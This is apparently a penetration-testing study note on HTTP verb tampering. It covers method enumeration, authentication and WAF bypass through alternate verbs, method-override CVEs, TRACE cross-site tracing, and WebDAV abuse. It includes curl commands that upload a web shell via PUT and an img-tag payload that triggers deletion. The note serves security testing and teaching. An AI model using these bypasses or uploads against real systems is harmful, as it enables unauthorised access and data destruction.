+++
title = 'HTTP Verb Tampering'
date = 2026-10-30
type = 'notes'
weight = 180
toc = true
tags = ['web', 'web-attacks', 'http', 'bypass']
+++

HTTP verb tampering exploits web servers and frameworks that **treat HTTP methods inconsistently** — a path that returns `403` on `GET` might return `200` on `POST`, `PUT`, or an obscure WebDAV method. The attack works by sending a request with an **unexpected method** to bypass authorization checks, security filters, or middleware that was only written for `GET` and `POST`.

The core problem is that many access-control configurations are **method-specific**. A rule like `<Limit GET POST> require valid-user </Limit>` in Apache protects only those two verbs; every other method — `HEAD`, `OPTIONS`, `PUT`, `DELETE`, `PATCH`, or an invented verb — reaches the handler **without authentication**.

---

## 1. HTTP Verbs

| Verb | Purpose |
|---|---|
| **GET** | Request data from a resource |
| **POST** | Send data to create or update a resource |
| **HEAD** | Identical to `GET`, but the response contains only headers |
| **PUT** | Write the request payload to the specified location |
| **DELETE** | Delete the resource at the specified location |
| **OPTIONS** | List the methods the server accepts for the resource |
| **PATCH** | Apply partial modifications to the resource |
| **TRACE** | Echo the request back — used for diagnostic and XST attacks |
| **CONNECT** | Establish a tunnel — rarely exposed |

### 1.1 The extended method surface

Modern servers often expose **WebDAV** and **DeltaV** methods that are not part of the core HTTP specification. These are the methods that filters forget to cover:

```
PROPFIND   PROPPATCH   MKCOL     COPY      MOVE
LOCK       UNLOCK      VERSION-CONTROL    REPORT
CHECKOUT   CHECKIN     UNCHECKOUT         MKWORKSPACE
UPDATE     LABEL       MERGE              BASELINE-CONTROL
MKACTIVITY ORDERPATCH  ACL                SEARCH
PURGE      SUBSCRIBE   REBIND             ARBITRARY
```

The `hvt` tool tests **53 known methods** by default, including the WebDAV and DeltaV sets, because a misconfigured server may accept `PROPFIND` where it rejects `GET`.

---

## 2. Method Enumeration

### 2.1 Discover what the server allows

```bash
# OPTIONS — the server's advertised method list
curl -i -X OPTIONS http://SERVER:PORT/
```

A `200` response with an `Allow` header lists the methods:

```
HTTP/1.1 200 OK
Allow: POST,OPTIONS,HEAD,GET
```

If `OPTIONS` is blocked or misleading, **fuzz the method space directly**:

```bash
# hvt — dedicated verb tampering scanner
hvt -u https://target.com/admin

# Test all 53 known methods
hvt -u https://target.com/admin --all

# Test a custom list
hvt -u https://target.com/admin -w methods.txt -s 200,302

# curl loop for a quick manual sweep
for m in GET HEAD POST PUT DELETE OPTIONS PATCH TRACE PROPFIND MKCOL; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X "$m" https://target.com/admin)
    echo "$m -> $code"
done
```

### 2.2 What to look for

| Signal | Meaning |
|---|---|
| `GET` → 401/403, `POST` → 200 | Authorization is method-specific; try other verbs |
| `HEAD` → 200 with a `Content-Length` | The resource is accessible via `HEAD` even if `GET` is blocked — content may be exfiltrated through length or timing |
| `OPTIONS` → 200 with a broad `Allow` | The server advertises methods the application may not protect |
| `TRACE` → 200 | Cross-Site Tracing (XST) is possible — cookies may be reflected even with `HttpOnly` |
| `PROPFIND` / `MKCOL` → 200 | WebDAV is enabled — potential file upload or information disclosure |

---

## 3. Bypassing Basic Authentication

A server that protects `GET` and `POST` with Basic Auth may leave other verbs unprotected:

```bash
# Baseline — GET is challenged
curl -i http://target.com/protected
# → HTTP/1.1 401 Unauthorized
# → WWW-Authenticate: Basic realm="..."

# Try HEAD — no body, but the status and headers still leak information
curl -i -X HEAD http://target.com/protected
# → HTTP/1.1 200 OK
# → Content-Length: 4242

# Try OPTIONS — the method list itself may bypass the auth gate
curl -i -X OPTIONS http://target.com/protected
# → HTTP/1.1 200 OK
# → Allow: POST,OPTIONS,HEAD,GET
```

A `200` on `HEAD` with a `Content-Length` confirms the resource exists and is reachable without credentials. A `200` on `OPTIONS` reveals the full method surface.

**Insecure configuration pattern:**

```apache
<Limit GET POST>
    require valid-user
</Limit>
```

The `<Limit>` directive restricts the auth requirement to the listed methods. `HEAD`, `PUT`, `DELETE`, `OPTIONS`, and every WebDAV method are **outside the limit** and reach the handler unauthenticated.

---

## 4. Bypassing Security Filters and WAFs

A security filter that inspects only `GET` and `POST` bodies can be bypassed by sending the same payload with a different verb.

### 4.1 The classic filter bypass

```bash
# The filter blocks the payload on POST
curl -X POST http://target/upload.php -d "file=malicious"

# The same payload on PUT or PATCH may not be inspected
curl -X PUT http://target/upload.php -d "file=malicious"
```

### 4.2 The `OPTIONS` bypass

When an error message such as `cannot GET /resource` appears, the server is advertising that the path exists but the method is wrong. Trying `OPTIONS` or `TRACE` can reveal routing information, and `POST` or `PUT` can reach the handler that `GET` could not.

```bash
# GET returns an error about the method
GET /upload.php → "Cannot GET /upload.php"

# OPTIONS reveals the accepted methods
OPTIONS /upload.php → Allow: POST, PUT, DELETE

# POST reaches the handler
POST /upload.php → 200 OK
```

### 4.3 Method change in Burp

The simplest manual technique: intercept the request in Burp Suite and use **Change request method** — this converts `GET` ↔ `POST` and preserves the body, exposing handlers that only validate one verb.

---

## 5. Method Override Headers and Parameters

Some frameworks accept **override headers or parameters** that change the effective method **without changing the HTTP request line**. This is intended to let clients that can only send `GET` or `POST` reach `PUT`/`DELETE` handlers — but it is a tampering primitive when it is enabled unconditionally.

| Override mechanism | Example |
|---|---|
| `X-HTTP-Method-Override` header | `X-HTTP-Method-Override: DELETE` |
| `_method` parameter | `?_method=DELETE` or body `_method=DELETE` |

### 5.1 CVE-2026-42551 — Flight PHP unconditional method override

**Affected:** Flight PHP **< 3.18.1**.

`Request::getMethod()` honoured both override mechanisms on **any** HTTP verb — including `GET` — with no opt-in and no whitelist of permitted target methods.

```
GET /item/42?_method=DELETE HTTP/1.1   → dispatched as DELETE /item/42
GET /item/42 HTTP/1.1
X-HTTP-Method-Override: DELETE          → dispatched as DELETE /item/42
```

**Impact:**

- **CSRF escalation** — a `GET` request silently becomes a `DELETE` or `PUT`. An `<img src="https://victim.tld/item/42?_method=DELETE">` triggers a destructive action on page load, with **no JavaScript required**.
- **Middleware bypass** — authentication, CSRF-token, or rate-limiting middleware gated only on `POST`/`DELETE` is bypassed because the request arrives as `GET`.
- **CDN cache poisoning** — the CDN caches the `GET` response body while the origin executed a `DELETE`.

**Patch:** Flight PHP 3.18.1 adds a `flight.allow_method_override` setting, defaulting to disabled.

### 5.2 Other method-override CVEs (2025–2026)

| CVE / Advisory | Product | Issue |
|---|---|---|
| **CVE-2025-3639** | Liferay Portal / DXP | MFA bypass by converting `POST` to `GET` on the login flow |
| **CVE-2026-101902** | Axios (0.27.2–0.34.0, 1.20.0) | Prototype pollution gadget — an inherited `Object.prototype.method` overrides the request method |
| **CVE-2026-85008** | undici (≤ 8.10.0) | Cache interceptor caches unsafe method responses, enabling replay |

> **The pattern:** method override is not inherently vulnerable, but **unconditional** override — no whitelist, enabled on safe verbs — turns every `GET` into a potential `DELETE`.

---

## 6. TRACE and Cross-Site Tracing (XST)

`TRACE` echoes the request back to the client, including headers. If the server supports it, an attacker can use an XSS payload to issue a `TRACE` request and read back the victim's cookies — **even when they are `HttpOnly`**.

```bash
curl -i -X TRACE http://target.com/ -H "Cookie: session=secret"
# → 200 OK
# → Cookie: session=secret   (reflected)
```

> **Modern reality:** most browsers block `TRACE` from JavaScript, and most servers disable it. It is worth a single check — not a sustained effort. If `TRACE` returns `405 Method Not Allowed`, move on.

---

## 7. WebDAV Methods

WebDAV methods extend HTTP with filesystem-like operations. A server that exposes WebDAV without authentication is a **direct file-write or file-read primitive**.

| Method | Purpose | Exploitation |
|---|---|---|
| **PROPFIND** | List properties of a resource | Directory listing / information disclosure |
| **PROPPATCH** | Modify properties | Overwrite metadata |
| **MKCOL** | Create a collection (directory) | Prepare a destination for `PUT` |
| **PUT** | Upload a file | Write a web shell to the webroot |
| **MOVE** / **COPY** | Move or copy a resource | Relocate an uploaded file into an executable directory |
| **LOCK** / **UNLOCK** | Lock a resource | Denial of service |

```bash
# Enumerate WebDAV
curl -X PROPFIND http://target.com/ -H "Depth: 1"

# Upload a file if PUT is allowed
curl -X PUT http://target.com/shell.jsp --data-binary @shell.jsp

# Create a directory, then upload into it
curl -X MKCOL http://target.com/uploads/
curl -X PUT http://target.com/uploads/shell.jsp --data-binary @shell.jsp
```

The `hvt --all` flag includes the WebDAV and DeltaV method sets specifically because these are the methods most often left unprotected.

---

## 8. Framework-Specific Routing Flaws

Different frameworks resolve method-override and method-not-allowed behaviour differently, and the differences are the attack surface.

| Framework | Behaviour to test |
|---|---|
| **Tomcat / JSP** | `TRACE` may be enabled by default; `PUT` may write to the webroot if `readonly` is false |
| **Spring** | `HiddenHttpMethodFilter` maps `_method`; check whether it is enabled and whether it applies to `GET` |
| **Express (Node)** | `method-override` middleware; `X-HTTP-Method-Override` is honoured if configured |
| **Flight PHP** | `_method` and `X-HTTP-Method-Override` on **any** verb — CVE-2026-42551 |
| **Liferay** | MFA bypass via `POST` → `GET` — CVE-2025-3639 |

> **The general test:** send a request with a benign verb (`GET`) plus an override header or parameter pointing at a dangerous verb (`DELETE`, `PUT`). If the server performs the dangerous action, the override is exploitable.

---

## 9. Tooling

| Tool | What it does |
|---|---|
| **hvt** | Dedicated verb-tampering scanner — 53 methods, custom lists, JSON output, header/cookie support |
| **Burp Suite** | *Change request method* for manual `GET` ↔ `POST`; *Repeater* for arbitrary verbs |
| **curl** | `-X METHOD` for any verb; `-i` to see headers |
| **ffuf** | Method fuzzing with a wordlist: `ffuf -w methods.txt -u https://target/admin -X FUZZ` |
| **nomore403** | 403/401 bypass suite — includes method tampering among its techniques |
| **TamperMAP** / **httpmethods** | Alternative method-scanning tools listed alongside `hvt` |
| **gobypass403** | Go-based 403 bypass tool with method manipulation |

### hvt quick reference

```bash
# Default scan — GET HEAD POST PUT DELETE CONNECT OPTIONS TRACE PATCH
hvt -u https://target.com/admin

# All 53 methods (WebDAV, DeltaV, etc.)
hvt -u https://target.com/admin --all

# Only safe methods
hvt -u https://target.com/admin --safe

# Custom method list
hvt -u https://target.com/admin -w methods.txt

# Show only 200/302, hide 404
hvt -u https://target.com/admin -s 200,302 -x 404

# With cookies and a proxy
hvt -u https://target.com/admin -c "session=abc123" --proxy http://127.0.0.1:8080

# JSON output
hvt -u https://target.com/admin -j results.json
```

---

## 10. Testing Methodology

```bash
# 1. Establish the baseline
curl -i https://target/protected          # → 401/403

# 2. Ask the server what it accepts
curl -i -X OPTIONS https://target/protected

# 3. Sweep the method space
hvt -u https://target/protected --all -s 200,201,204,302

# 4. For each method that returns 200/302, inspect the response
#    — does it leak data? does it perform an action?

# 5. Test override mechanisms
curl -X GET "https://target/item/1?_method=DELETE"
curl -X GET https://target/item/1 -H "X-HTTP-Method-Override: DELETE"

# 6. Test WebDAV if PROPFIND/MKCOL/PUT respond
curl -X PROPFIND https://target/ -H "Depth: 1"
curl -X PUT https://target/test.txt --data "test"

# 7. Check TRACE once
curl -i -X TRACE https://target/ -H "Cookie: a=b"
```

---

## 11. Field Notes

- **Method-specific auth is the root cause.** `<Limit GET POST>` and `if ($_SERVER['REQUEST_METHOD'] === 'POST')` are the two patterns to look for. Any method outside the check reaches the handler unprotected.
- **`HEAD` is the quiet bypass.** It returns the same status and headers as `GET` but no body — a `200` with a `Content-Length` proves access even when the content is not readable.
- **`OPTIONS` is reconnaissance, not exploitation.** It tells you which methods to try next.
- **Override mechanisms are a separate attack.** `_method` and `X-HTTP-Method-Override` turn a safe `GET` into a destructive `DELETE` — CVE-2026-42551 is the canonical 2026 example.
- **WebDAV is still exposed.** `PROPFIND`, `MKCOL`, and `PUT` on a misconfigured server are a direct file-write primitive. `hvt --all` covers the full WebDAV method set.
- **`TRACE` is usually dead.** Check it once; if it returns `405`, move on.
- **Test the override on `GET`.** If `_method=DELETE` works on a `GET` request, the server is vulnerable to CSRF-style deletion with an `<img>` tag — no JavaScript required.
- **Method fuzzing is cheap.** `hvt` or a `curl` loop over ten verbs takes seconds and frequently finds a bypass that a full directory brute-force misses.

---

This file sits alongside the **Fuzzing** and **File Upload** notes: the fuzzing pipeline finds the endpoints, and verb tampering is the first bypass to try on any `401`/`403` before moving to header injection or path manipulation.
